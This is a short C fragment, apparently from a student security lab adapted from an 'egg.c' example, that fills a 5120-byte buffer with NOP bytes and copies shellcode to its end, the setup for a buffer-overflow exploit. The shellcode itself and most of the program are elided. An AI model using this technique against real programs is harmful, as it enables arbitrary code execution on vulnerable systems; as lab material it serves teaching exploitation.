/* following code is inspired from the egg.c code provided in lab hours and modified according to the need */
...
int main(void)
{
  ...
  memset(shell,NOP,5120);     /* fill-up the buffer with NOP */

  /* fill-up the shellcode on the second half to the end of buffer */
  memcpy(&shell[5120-strlen(shellcode)],shellcode,strlen(shellcode));
